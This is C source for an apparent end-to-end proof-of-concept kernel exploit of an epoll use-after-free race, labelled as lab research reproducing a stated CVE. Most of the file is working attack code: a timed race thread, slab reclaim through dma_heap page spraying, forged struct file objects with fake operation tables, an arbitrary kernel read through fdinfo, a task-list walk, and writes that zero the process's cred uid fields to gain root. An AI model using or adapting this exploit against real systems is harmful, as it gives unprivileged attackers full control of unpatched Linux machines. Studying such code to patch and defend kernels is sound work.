// test_exp029_e2e.c — EXP-029: Corrected Unassisted End-to-End PoC
// Fixes over HYP-013:
//   1. Runtime slab stride from /sys/kernel/slab/filp/{slab_size,objs_per_slab}
//   2. EVO-036 safe layout at EVERY object slot; exploit payload at slot 0 only
//   3. Safe cleanup on reclaim miss: leak ep_uaf_waiter instead of close()
//   4. Explicit privilege verification pre+post (guards against VER-064 failure mode)
//   5. Symbol addresses resolved from /proc/kallsyms (no hardcoded addresses)
//   6. slab telemetry done BEFORE privilege drop (init.c chmod handles this now)
//
// This file is for authorized, in-house security research reproducing
// CVE-2026-46242 in an isolated QEMU lab. The upstream fix is public.

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdarg.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <errno.h>

// ───────────────────────────────────────────────────────────
// Constants
// ───────────────────────────────────────────────────────────
#define TOTAL_TRIALS         150000
#define RACE_DUP_CLOSE_ITERS 15
#define RACE_ENQUEUE_FORKS   2
#define RACE_WAITER_EPFDS    20
#define RACE_WAITER_DUPS     10

#define BATCH_A_SIZE    32
#define BATCH_B_SIZE    32
#define BG_PRESSURE_FILES 4000
#define PAGES_PER_ROUND  8192
#define MAX_RETRIES      5     // max Stage-2 reclaim attempts per race win

// dma_heap ioctl (from <linux/dma-heap.h> which musl may not have)
#ifndef DMA_HEAP_IOCTL_ALLOC
#define DMA_HEAP_IOCTL_ALLOC 0xc0184800
struct dma_heap_allocation_data {
    uint64_t len;
    uint32_t fd;
    uint32_t fd_flags;
    uint64_t heap_flags;
};
#endif

// Offsets in struct task_struct (GKI 6.1.23)
#define OFF_TASKS 1232
#define OFF_PID   1456
#define OFF_CRED  1928
#define OFF_COMM  1944

// Offsets in struct cred
#define OFF_CRED_UID   4
#define OFF_CRED_EUID  20
#define OFF_CRED_FSUID 28

// Offsets in struct file
#define FOFF_INODE     0x20   // f_inode
#define FOFF_OP        0x28   // f_op
#define FOFF_LOCK      0x30   // f_lock
#define FOFF_COUNT     0x38   // f_count
#define FOFF_MODE      0x44   // f_mode
#define FOFF_VERSION   0xb8   // f_version
#define FOFF_PRIVDATA  0xc8   // private_data
#define FOFF_FEP       0xd0   // f_ep

// ───────────────────────────────────────────────────────────
// Globals
// ───────────────────────────────────────────────────────────
static volatile int g_race_ready_main = 0;
static volatile int g_race_ready_racer = 0;
static volatile int g_race_done = 0;
static volatile int g_ep_race_waiter = -1;
static volatile uint64_t g_time_false_sharing = 10000;
static volatile int g_stop_racer = 0;
static int g_timerfd_wakeup = -1;
static struct epoll_event g_ev = { .events = EPOLLIN | EPOLLOUT };

// Resolved at runtime from /proc/kallsyms
static uint64_t INIT_TASK_ADDR = 0;
static uint64_t SWAPS_PROC_OPS_ADDR = 0;
static uint64_t EMPTY_ZERO_PAGE_ADDR = 0;
static uint64_t COMM_ADDR = 0;  // init_task + OFF_COMM
static uint64_t FAKE_FOPS_ADDR = 0;  // swaps_proc_ops - 0x48

// Slab geometry (read at runtime)
static int g_slab_stride = 256;   // actual per-object spacing in bytes
static int g_objs_per_slab = 16;  // objects per 4KB page

// ───────────────────────────────────────────────────────────
// Helpers
// ───────────────────────────────────────────────────────────
static inline uint64_t mono_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static inline void pin_to_cpu(int cpu) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
}

static void pr(const char *s) {
    write(STDOUT_FILENO, s, strlen(s));
}

static void prf(const char *fmt, ...) {
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) write(STDOUT_FILENO, buf, n);
}

static int read_sysfs_int(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    char buf[64] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return (int)strtol(buf, NULL, 10);
}

static long read_filp_slabs_count(void) {
    int fd = open("/sys/kernel/slab/filp/slabs", O_RDONLY);
    if (fd < 0) return -1;
    char buf[64] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return strtol(buf, NULL, 10);
}

static uint64_t get_kallsyms_address(const char *name) {
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[256];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), f)) {
        char sym_type;
        char sym_name[128];
        uint64_t sym_addr;
        if (sscanf(line, "%llx %c %127s", (unsigned long long *)&sym_addr, &sym_type, sym_name) == 3) {
            if (strcmp(sym_name, name) == 0) {
                addr = sym_addr;
                break;
            }
        }
    }
    fclose(f);
    return addr;
}

// ───────────────────────────────────────────────────────────
// Slab geometry discovery
// ───────────────────────────────────────────────────────────
static void discover_slab_geometry(void) {
    // Try slab_size first (actual stride including HWCACHE_ALIGN padding)
    int slab_size = read_sysfs_int("/sys/kernel/slab/filp/slab_size");
    int obj_size = read_sysfs_int("/sys/kernel/slab/filp/object_size");
    int objs = read_sysfs_int("/sys/kernel/slab/filp/objs_per_slab");

    prf("[*] Slab geometry: object_size=%d, slab_size=%d, objs_per_slab=%d\n",
        obj_size, slab_size, objs);

    if (slab_size > 0 && slab_size >= obj_size) {
        // slab_size is the actual stride
        g_slab_stride = slab_size;
    } else if (objs > 0) {
        // Compute stride from page size and objects per slab
        g_slab_stride = 4096 / objs;
    } else if (obj_size > 0) {
        // Fallback: use object_size (may be wrong if HWCACHE_ALIGN pads it)
        g_slab_stride = obj_size;
    }
    // else keep default 256

    if (objs > 0) g_objs_per_slab = objs;

    prf("[*] Using slab stride = %d bytes (%d objects per page)\n",
        g_slab_stride, g_objs_per_slab);

    // Sanity check: stride * objs should fit in a page
    if (g_slab_stride * g_objs_per_slab > 4096) {
        prf("[!] WARNING: stride*objs = %d > 4096. Clamping objs_per_slab.\n",
            g_slab_stride * g_objs_per_slab);
        g_objs_per_slab = 4096 / g_slab_stride;
    }
}

// ───────────────────────────────────────────────────────────
// Payload construction
// Fill page with safe layout at every slot, exploit payload at slot 0
// ───────────────────────────────────────────────────────────
static void build_payload_page(char *page) {
    memset(page, 0, 4096);

    for (int slot = 0; slot < g_objs_per_slab; slot++) {
        int off = slot * g_slab_stride;
        if (off + FOFF_FEP + 8 > 4096) break;  // safety

        if (slot == 0) {
            // ── EXPLOIT SLOT ──
            // f_inode → points to init_task.comm - 0x40 (for "swapper/" AAR canary)
            *(uint64_t *)(page + off + FOFF_INODE) = COMM_ADDR - 0x40;
            // f_op → fake fops table → swaps_poll at poll offset
            *(uint64_t *)(page + off + FOFF_OP) = FAKE_FOPS_ADDR;
            // f_lock = 0 (safe for spin_lock path)
            *(uint32_t *)(page + off + FOFF_LOCK) = 0;
            // f_count = 0 (not used in UAF path)
            *(uint64_t *)(page + off + FOFF_COUNT) = 0;
            // f_mode = 0 (don't need FMODE_CAN_READ for exploit slot)
            *(uint32_t *)(page + off + FOFF_MODE) = 0;
            // f_version = 0 (bypass any debugfs UAF check)
            *(uint64_t *)(page + off + FOFF_VERSION) = 0;
            // private_data: will be set per-fire to (target_addr - 96)
            *(uint64_t *)(page + off + FOFF_PRIVDATA) = 0;
            // f_ep → empty_zero_page (EVO-036: safe for __ep_remove cleanup)
            *(uint64_t *)(page + off + FOFF_FEP) = EMPTY_ZERO_PAGE_ADDR;
        } else {
            // ── SAFE FALLBACK SLOT (EVO-036 / VER-067) ──
            // These fields ensure __ep_remove cleanup survives if the
            // victim file lands on a non-target slot.
            *(uint64_t *)(page + off + FOFF_INODE) = COMM_ADDR - 0x40;
            *(uint64_t *)(page + off + FOFF_OP) = EMPTY_ZERO_PAGE_ADDR;  // neutral f_op
            *(uint32_t *)(page + off + FOFF_LOCK) = 0;
            *(uint64_t *)(page + off + FOFF_COUNT) = 1;    // refcount = 1 (neutral)
            *(uint32_t *)(page + off + FOFF_MODE) = 0x20000;  // FMODE_CAN_READ
            *(uint64_t *)(page + off + FOFF_VERSION) = 0;
            *(uint64_t *)(page + off + FOFF_FEP) = EMPTY_ZERO_PAGE_ADDR;
        }
    }
}

// ───────────────────────────────────────────────────────────
// Re-aim private_data for swaps_poll write target
// ───────────────────────────────────────────────────────────
static void set_write_target(void **spray_pages, int num_pages, uint64_t target_addr) {
    // swaps_poll writes proc_poll_event (a u32) to private_data + 96
    // So we set private_data = target_addr - 96
    uint64_t privdata = target_addr - 96;
    for (int p = 0; p < num_pages; p++) {
        char *page = (char *)spray_pages[p];
        // Only set on slot 0 (exploit slot)
        *(uint64_t *)(page + 0 + FOFF_PRIVDATA) = privdata;
    }
}

// ───────────────────────────────────────────────────────────
// Re-aim f_inode for AAR read
// ───────────────────────────────────────────────────────────
static void set_aar_target(void **spray_pages, int num_pages, uint64_t target_addr) {
    uint64_t fake_inode = target_addr - 0x40;
    for (int p = 0; p < num_pages; p++) {
        char *page = (char *)spray_pages[p];
        // Set on ALL slots (any slot might be the victim)
        for (int slot = 0; slot < g_objs_per_slab; slot++) {
            int off = slot * g_slab_stride;
            if (off + FOFF_INODE + 8 > 4096) break;
            *(uint64_t *)(page + off + FOFF_INODE) = fake_inode;
        }
    }
}

// ───────────────────────────────────────────────────────────
// fdinfo AAR read
// ───────────────────────────────────────────────────────────
static int read_fdinfo_ino(int epfd, unsigned long *out_ino) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    char buf[512] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';

    char *tfd_str = strstr(buf, "tfd:");
    if (tfd_str) {
        char *ino_str = strstr(tfd_str, "ino:");
        if (ino_str) {
            *out_ino = strtoul(ino_str + 4, NULL, 16);
            return 0;
        }
    }
    *out_ino = 0;
    return -1;
}

static uint64_t aar_read64(int epA, void **spray_pages, int num_pages, uint64_t target_addr) {
    set_aar_target(spray_pages, num_pages, target_addr);
    unsigned long val = 0;
    if (read_fdinfo_ino(epA, &val) == 0) return val;
    return 0;
}

static int check_swapper_canary(int epA) {
    unsigned long ino = 0;
    if (read_fdinfo_ino(epA, &ino) != 0) return 0;
    return (ino == 0x2f72657070617773ULL || ino == 0x0072657070617773ULL);
}

// ───────────────────────────────────────────────────────────
// Survivor check via fdinfo
// ───────────────────────────────────────────────────────────
static int check_survivor_fdinfo(int epfd) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    char buf[512] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';
    // A survivor has a "tfd:" line for the dangling epitem
    return (strstr(buf, "tfd:") != NULL) ? 1 : 0;
}

// ───────────────────────────────────────────────────────────
// dma_heap device node setup
// ───────────────────────────────────────────────────────────
static int setup_dmabuf_devnode(void) {
    int sys_fd = open("/sys/class/dma_heap/system/dev", O_RDONLY);
    if (sys_fd < 0) return -1;
    char dev_str[32] = {0};
    int n = read(sys_fd, dev_str, sizeof(dev_str) - 1);
    close(sys_fd);
    if (n <= 0) return -1;
    dev_str[n] = '\0';

    int major = 0, minor = 0;
    if (sscanf(dev_str, "%d:%d", &major, &minor) != 2) return -1;

    mkdir("/dev/dma_heap", 0755);
    unlink("/dev/dma_heap/system");
    if (mknod("/dev/dma_heap/system", S_IFCHR | 0666, makedev(major, minor)) < 0) return -1;
    chmod("/dev/dma_heap/system", 0666);
    return 0;
}

// ───────────────────────────────────────────────────────────
// Timerfd widening
// ───────────────────────────────────────────────────────────
static void setup_timerfd_waiters(int tfd) {
    for (int i = 0; i < RACE_ENQUEUE_FORKS; i++) {
        if (fork() == 0) {
            pin_to_cpu(0);
            int epfds[RACE_WAITER_EPFDS];
            for (int j = 0; j < RACE_WAITER_EPFDS; j++) {
                epfds[j] = epoll_create1(0);
                for (int k = 0; k < RACE_WAITER_DUPS; k++) {
                    int dupfd = dup(tfd);
                    struct epoll_event ev = { .events = EPOLLIN, .data.fd = dupfd };
                    epoll_ctl(epfds[j], EPOLL_CTL_ADD, dupfd, &ev);
                }
            }
            while (1) sleep(1000);
            _exit(0);
        }
    }
}

// ───────────────────────────────────────────────────────────
// Racer thread
// ───────────────────────────────────────────────────────────
static void *racer_thread_func(void *arg) {
    pin_to_cpu(0);
    uint64_t launch_ahead_ns = 2500;
    while (!g_stop_racer) {
        while (!g_race_ready_main && !g_stop_racer) sched_yield();
        if (g_stop_racer) break;

        g_race_ready_main = 0;
        g_race_ready_racer = 1;

        uint64_t t_now = mono_ns();
        uint64_t t_fire = t_now + g_time_false_sharing / 2;
        struct itimerspec its;
        memset(&its, 0, sizeof(its));
        its.it_value.tv_sec = t_fire / 1000000000ULL;
        its.it_value.tv_nsec = t_fire % 1000000000ULL;
        timerfd_settime(g_timerfd_wakeup, TFD_TIMER_ABSTIME, &its, NULL);

        uint64_t t_close = t_fire > launch_ahead_ns ? (t_fire - launch_ahead_ns) : t_fire;
        while (mono_ns() < t_close) {}

        close(g_ep_race_waiter);
        g_race_done = 1;
    }
    return NULL;
}

// ───────────────────────────────────────────────────────────
// MAIN
// ───────────────────────────────────────────────────────────
int main(int argc, char **argv) {
    pr("==========================================================\n");
    pr("=== EXP-029: Corrected Unassisted E2E PoC (Step 2)     ===\n");
    pr("==========================================================\n");

    // ── STEP 0: Filesystem setup (must be done as root/init) ──
    struct rlimit rlim = { .rlim_cur = 65536, .rlim_max = 65536 };
    setrlimit(RLIMIT_NOFILE, &rlim);

    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);
    mkdir("/sys", 0755);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
    mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));
    chmod("/dev/null", 0666);

    // Create dma_heap device node while still root
    if (setup_dmabuf_devnode() != 0) {
        pr("[-] FATAL: Could not create /dev/dma_heap/system device node.\n");
        pr("[-] CONFIG_DMABUF_HEAPS_SYSTEM must be =y in the kernel build.\n");
        reboot(0x4321fedc);
        return 1;
    }
    pr("[+] /dev/dma_heap/system device node created.\n");

    // chmod slab telemetry nodes for unprivileged access (LAB DEVIATION, EVO-034)
    chmod("/sys/kernel/slab/filp/slabs", 0444);
    chmod("/sys/kernel/slab/filp/object_size", 0444);
    chmod("/sys/kernel/slab/filp/objs_per_slab", 0444);
    chmod("/sys/kernel/slab/filp/slab_size", 0444);

    // ── Discover slab geometry BEFORE priv drop ──
    discover_slab_geometry();

    // ── Resolve symbols from /proc/kallsyms BEFORE priv drop ──
    // (kallsyms may be restricted after drop depending on kptr_restrict)
    INIT_TASK_ADDR = get_kallsyms_address("init_task");
    SWAPS_PROC_OPS_ADDR = get_kallsyms_address("swaps_proc_ops");
    EMPTY_ZERO_PAGE_ADDR = get_kallsyms_address("empty_zero_page");

    if (INIT_TASK_ADDR == 0 || SWAPS_PROC_OPS_ADDR == 0 || EMPTY_ZERO_PAGE_ADDR == 0) {
        prf("[-] FATAL: Failed to resolve symbols: init_task=%llx swaps_proc_ops=%llx empty_zero_page=%llx\n",
            (unsigned long long)INIT_TASK_ADDR,
            (unsigned long long)SWAPS_PROC_OPS_ADDR,
            (unsigned long long)EMPTY_ZERO_PAGE_ADDR);
        reboot(0x4321fedc);
        return 1;
    }

    COMM_ADDR = INIT_TASK_ADDR + OFF_COMM;
    // poll is at offset 0x48 in struct file_operations
    // We want f_op->poll to resolve to swaps_poll
    // swaps_proc_ops has .proc_poll = swaps_poll at some offset
    // Per EVO-026: fake_fops = swaps_proc_ops - 0x48
    FAKE_FOPS_ADDR = SWAPS_PROC_OPS_ADDR - 0x48;

    prf("[*] Symbols resolved:\n");
    prf("[*]   init_task       = 0x%llx\n", (unsigned long long)INIT_TASK_ADDR);
    prf("[*]   comm            = 0x%llx\n", (unsigned long long)COMM_ADDR);
    prf("[*]   swaps_proc_ops  = 0x%llx\n", (unsigned long long)SWAPS_PROC_OPS_ADDR);
    prf("[*]   empty_zero_page = 0x%llx\n", (unsigned long long)EMPTY_ZERO_PAGE_ADDR);
    prf("[*]   fake_fops       = 0x%llx\n", (unsigned long long)FAKE_FOPS_ADDR);

    // ── Open dma_heap BEFORE priv drop ──
    int dma_heap_fd = open("/dev/dma_heap/system", O_RDWR);
    if (dma_heap_fd < 0) {
        pr("[-] FATAL: Failed to open /dev/dma_heap/system.\n");
        reboot(0x4321fedc);
        return 1;
    }
    pr("[+] dma_heap fd obtained.\n");

    // ───────────────────────────────────────────────────────
    // PRIVILEGE DROP — VER-064 GUARD
    // ───────────────────────────────────────────────────────
    prf("[*] PRE-DROP PRIVILEGE CHECK: uid=%d euid=%d\n", getuid(), geteuid());

    if (setresgid(2000, 2000, 2000) != 0 || setresuid(2000, 2000, 2000) != 0) {
        perror("[-] FATAL: Failed to drop privileges");
        reboot(0x4321fedc);
        return 1;
    }

    uid_t post_drop_uid = getuid();
    uid_t post_drop_euid = geteuid();
    prf("[*] POST-DROP PRIVILEGE CHECK: uid=%d euid=%d\n", post_drop_uid, post_drop_euid);

    if (post_drop_uid == 0 || post_drop_euid == 0) {
        pr("[-] FATAL: Privilege drop failed! Still running as root. ABORTING.\n");
        pr("[-] (This guard prevents the VER-064 false-success failure mode.)\n");
        reboot(0x4321fedc);
        return 1;
    }

    if (post_drop_uid != 2000) {
        prf("[-] FATAL: Unexpected uid=%d after drop. ABORTING.\n", post_drop_uid);
        reboot(0x4321fedc);
        return 1;
    }

    pr("==========================================================\n");
    pr("[+] PRIVILEGE DROP CONFIRMED: uid=2000, euid=2000.\n");
    pr("[+] Any future getuid()==0 is a GENUINE escalation result.\n");
    pr("==========================================================\n");

    pin_to_cpu(1);

    // ── Timerfd widening setup ──
    g_timerfd_wakeup = timerfd_create(CLOCK_MONOTONIC, 0);
    if (g_timerfd_wakeup >= 0) {
        setup_timerfd_waiters(g_timerfd_wakeup);
        pr("[+] Timerfd interrupt widening queue configured.\n");
    }

    // ── Background pressure files ──
    int bg_fds[BG_PRESSURE_FILES];
    for (int i = 0; i < BG_PRESSURE_FILES; i++) bg_fds[i] = eventfd(0, 0);

    // ── Start racer thread ──
    pthread_t racer_th;
    pthread_create(&racer_th, NULL, racer_thread_func, NULL);

    prf("[*] Starting N=%d natural two-stage race iterations...\n", TOTAL_TRIALS);

    int race_wins = 0;
    int reclaim_hits = 0;
    int fires = 0;
    int panics_avoided = 0;

    // Track leaked fds so we know the cost
    int leaked_ep_count = 0;

    for (int iter = 1; iter <= TOTAL_TRIALS; iter++) {
        int ep_race_waiter = epoll_create1(0);
        int ep_race_target = epoll_create1(0);
        int ep_uaf_waiter = epoll_create1(0);

        if (ep_race_waiter < 0 || ep_race_target < 0 || ep_uaf_waiter < 0) {
            if (ep_race_waiter >= 0) close(ep_race_waiter);
            if (ep_race_target >= 0) close(ep_race_target);
            if (ep_uaf_waiter >= 0) close(ep_uaf_waiter);
            continue;
        }

        epoll_ctl(ep_race_waiter, EPOLL_CTL_ADD, ep_race_target, &g_ev);

        int batch_a_fds[BATCH_A_SIZE];
        for (int i = 0; i < BATCH_A_SIZE; i++) batch_a_fds[i] = open("/dev/null", O_RDONLY);

        g_ep_race_waiter = ep_race_waiter;
        g_race_ready_main = 1;
        while (!g_race_ready_racer) sched_yield();
        g_race_ready_racer = 0;

        uint64_t t0 = mono_ns();
        for (int j = 0; j < RACE_DUP_CLOSE_ITERS; j++) close(dup(ep_race_target));
        g_time_false_sharing = mono_ns() - t0;

        close(ep_race_target);

        int ep_uaf_target = epoll_create1(0);
        int armed_efd = -1;

        if (ep_uaf_target >= 0) {
            epoll_ctl(ep_uaf_waiter, EPOLL_CTL_ADD, ep_uaf_target, &g_ev);
            armed_efd = eventfd(1, EFD_NONBLOCK);
            struct epoll_event armed_ev = { .events = EPOLLIN, .data.fd = armed_efd };
            epoll_ctl(ep_uaf_target, EPOLL_CTL_ADD, armed_efd, &armed_ev);
        }

        int batch_b_fds[BATCH_B_SIZE];
        for (int i = 0; i < BATCH_B_SIZE; i++) batch_b_fds[i] = open("/dev/null", O_RDONLY);

        while (!g_race_done) sched_yield();
        g_race_done = 0;

        if (ep_uaf_target >= 0) close(ep_uaf_target);

        if (!check_survivor_fdinfo(ep_uaf_waiter)) {
            // No survivor — safe to close everything
            close(ep_uaf_waiter);
            for (int i = 0; i < BATCH_A_SIZE; i++) close(batch_a_fds[i]);
            for (int i = 0; i < BATCH_B_SIZE; i++) close(batch_b_fds[i]);
            if (armed_efd >= 0) close(armed_efd);

            if (iter % 5000 == 0) {
                prf("[*] Completed %d / %d iterations (wins=%d)...\n",
                    iter, TOTAL_TRIALS, race_wins);
            }
            continue;
        }

        // ═══════════════════════════════════════════════════
        // SURVIVOR DETECTED — execute victim sandwich drain
        // ═══════════════════════════════════════════════════
        race_wins++;
        prf("[+] NATURAL RACE HIT! Iteration %d (total wins=%d). Draining...\n",
            iter, race_wins);

        long slabs_before = read_filp_slabs_count();

        for (int i = 0; i < BATCH_A_SIZE; i++) close(batch_a_fds[i]);
        for (int i = 0; i < BATCH_B_SIZE; i++) close(batch_b_fds[i]);
        for (int i = 0; i < BG_PRESSURE_FILES; i++) close(bg_fds[i]);
        if (armed_efd >= 0) close(armed_efd);

        // Wait for RCU grace period to expire, freeing slab pages to buddy
        sleep(2);

        long slabs_after = read_filp_slabs_count();
        prf("[*] Slab drain: %ld -> %ld slabs (delta=%ld)\n",
            slabs_before, slabs_after,
            slabs_before > 0 && slabs_after > 0 ? slabs_before - slabs_after : 0);

        // ── SPRAY with correctly-strided safe layout ──
        void *spray_pages[PAGES_PER_ROUND];
        int dma_fds[PAGES_PER_ROUND];
        int spray_count = 0;

        // Build a template page with the correct stride
        char template_page[4096];
        build_payload_page(template_page);

        for (int i = 0; i < PAGES_PER_ROUND; i++) {
            struct dma_heap_allocation_data alloc = {
                .len = 4096,
                .fd_flags = O_RDWR | O_CLOEXEC,
                .heap_flags = 0
            };
            if (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &alloc) < 0) {
                dma_fds[i] = -1;
                spray_pages[i] = NULL;
                continue;
            }
            dma_fds[i] = alloc.fd;
            void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, alloc.fd, 0);
            if (p == MAP_FAILED) {
                spray_pages[i] = NULL;
                continue;
            }
            spray_pages[i] = p;
            memcpy(p, template_page, 4096);
            spray_count++;
        }

        prf("[*] Sprayed %d pages (target=%d)\n", spray_count, PAGES_PER_ROUND);

        // ── CHECK ORACLE ──
        int oracle_hit = check_swapper_canary(ep_uaf_waiter);

        if (oracle_hit) {
            reclaim_hits++;
            pr("[+] AAR Oracle Hit! ('swapper/') — reclaim succeeded.\n");

            // ── AAR WALK: Find our task's cred ──
            uint64_t curr_task = INIT_TASK_ADDR;
            uint64_t harness_cred = 0;
            pid_t my_pid = getpid();

            for (int step = 0; step < 512; step++) {
                uint64_t c1 = aar_read64(ep_uaf_waiter, spray_pages, spray_count, curr_task + OFF_COMM);
                uint64_t c2 = aar_read64(ep_uaf_waiter, spray_pages, spray_count, curr_task + OFF_COMM + 8);
                uint64_t task_pid = aar_read64(ep_uaf_waiter, spray_pages, spray_count, curr_task + OFF_PID) & 0xFFFFFFFF;
                uint64_t task_cred = aar_read64(ep_uaf_waiter, spray_pages, spray_count, curr_task + OFF_CRED);
                char t_comm[17] = {0};
                memcpy(t_comm, &c1, 8);
                memcpy(t_comm + 8, &c2, 8);

                if ((int)task_pid == my_pid || strstr(t_comm, "harness") != NULL) {
                    harness_cred = task_cred;
                    prf("[+] Found harness task! pid=%d comm='%s' cred=0x%llx\n",
                        (int)task_pid, t_comm, (unsigned long long)task_cred);
                    break;
                }

                uint64_t next_tasks = aar_read64(ep_uaf_waiter, spray_pages, spray_count, curr_task + OFF_TASKS);
                if (next_tasks == 0 || next_tasks == (INIT_TASK_ADDR + OFF_TASKS)) break;
                curr_task = next_tasks - OFF_TASKS;
            }

            if (harness_cred != 0) {
                // Verify current cred.uid via AAR
                uint64_t uid_aar = aar_read64(ep_uaf_waiter, spray_pages, spray_count,
                                              harness_cred + OFF_CRED_UID) & 0xFFFFFFFF;
                prf("[*] AAR cred.uid = %d (expected 2000)\n", (int)uid_aar);

                if ((int)uid_aar == 2000) {
                    prf("[*] PRE-WRITE PRIVILEGE: getuid()=%d, geteuid()=%d\n",
                        getuid(), geteuid());
                    pr("[*] Commencing gated swaps_poll writes to zero cred fields...\n");

                    // ── ZERO cred.uid ──
                    // Re-verify canary before each write
                    set_aar_target(spray_pages, spray_count, COMM_ADDR);
                    set_write_target(spray_pages, spray_count, harness_cred + OFF_CRED_UID);
                    if (check_swapper_canary(ep_uaf_waiter)) {
                        struct epoll_event res[4];
                        epoll_wait(ep_uaf_waiter, res, 4, 0);
                        fires++;
                        pr("[*] Fired swaps_poll → cred.uid\n");
                    } else {
                        pr("[-] GATED CHECK FAILED for cred.uid. Skipping.\n");
                    }

                    // ── ZERO cred.euid ──
                    set_write_target(spray_pages, spray_count, harness_cred + OFF_CRED_EUID);
                    set_aar_target(spray_pages, spray_count, COMM_ADDR);
                    if (check_swapper_canary(ep_uaf_waiter)) {
                        struct epoll_event res[4];
                        epoll_wait(ep_uaf_waiter, res, 4, 0);
                        fires++;
                        pr("[*] Fired swaps_poll → cred.euid\n");
                    } else {
                        pr("[-] GATED CHECK FAILED for cred.euid. Skipping.\n");
                    }

                    // ── ZERO cred.fsuid ──
                    set_write_target(spray_pages, spray_count, harness_cred + OFF_CRED_FSUID);
                    set_aar_target(spray_pages, spray_count, COMM_ADDR);
                    if (check_swapper_canary(ep_uaf_waiter)) {
                        struct epoll_event res[4];
                        epoll_wait(ep_uaf_waiter, res, 4, 0);
                        fires++;
                        pr("[*] Fired swaps_poll → cred.fsuid\n");
                    } else {
                        pr("[-] GATED CHECK FAILED for cred.fsuid. Skipping.\n");
                    }

                    // ── POST-WRITE VERIFICATION ──
                    uid_t post_uid = getuid();
                    uid_t post_euid = geteuid();
                    prf("[*] POST-WRITE PRIVILEGE: getuid()=%d, geteuid()=%d\n",
                        post_uid, post_euid);

                    if (post_uid == 0 && post_euid == 0) {
                        pr("==========================================================\n");
                        pr("[+ SUCCESS +] GENUINE ROOT PRIVILEGE ESCALATION (UID 0)!\n");
                        prf("[+ SUCCESS +] Fires: %d, Race Wins: %d, Reclaim Hits: %d\n",
                            fires, race_wins, reclaim_hits);
                        pr("[+ SUCCESS +] Pre-drop confirmed uid=2000.\n");
                        pr("[+ SUCCESS +] Post-write getuid()=0 is GENUINE.\n");
                        pr("==========================================================\n");
                        // INTENTIONALLY LEAK ep_uaf_waiter (don't close, avoid cleanup path)
                        // Power off cleanly
                        reboot(0x4321fedc);
                        return 0;
                    } else {
                        prf("[-] Post-write uid=%d euid=%d — write did not achieve uid 0.\n",
                            post_uid, post_euid);
                        if (fires == 0) {
                            pr("[-] All gated checks failed. No write fired.\n");
                        }
                    }
                } else {
                    prf("[-] AAR cred.uid=%d != 2000. Task walk failed.\n", (int)uid_aar);
                }
            } else {
                pr("[-] Failed to locate harness task in task list via AAR walk.\n");
            }
        } else {
            pr("[-] AAR Oracle Miss. Reclaim failed.\n");
            panics_avoided++;
        }

        // ── SAFE CLEANUP ──
        // DO NOT close(ep_uaf_waiter) — that triggers __ep_remove on
        // the dangling survivor epitem → panic if victim struct file
        // wasn't reclaimed. Instead, leak the fd. This costs 1 fd per
        // race win but avoids the HYP-013 cleanup panic (EVO-035).
        leaked_ep_count++;
        prf("[*] Leaked ep_uaf_waiter fd (total leaked: %d) to avoid cleanup panic.\n",
            leaked_ep_count);

        // Clean up spray
        for (int i = 0; i < PAGES_PER_ROUND; i++) {
            if (spray_pages[i]) munmap(spray_pages[i], 4096);
            if (dma_fds[i] >= 0) close(dma_fds[i]);
        }

        // Re-allocate background pressure files for next iteration
        for (int i = 0; i < BG_PRESSURE_FILES; i++) bg_fds[i] = eventfd(0, 0);
    }

    g_stop_racer = 1;
    pthread_join(racer_th, NULL);

    pr("==========================================================\n");
    prf("[-] Failed to achieve root within %d iterations.\n", TOTAL_TRIALS);
    prf("[*] FINAL TELEMETRY:\n");
    prf("[*]   Race Wins:       %d\n", race_wins);
    prf("[*]   Reclaim Hits:    %d\n", reclaim_hits);
    prf("[*]   Fires:           %d\n", fires);
    prf("[*]   Panics Avoided:  %d\n", panics_avoided);
    prf("[*]   Leaked EPs:      %d\n", leaked_ep_count);
    prf("[*]   Final uid=%d euid=%d (started as uid=2000)\n", getuid(), geteuid());
    pr("==========================================================\n");
    reboot(0x4321fedc);
    return 1;
}
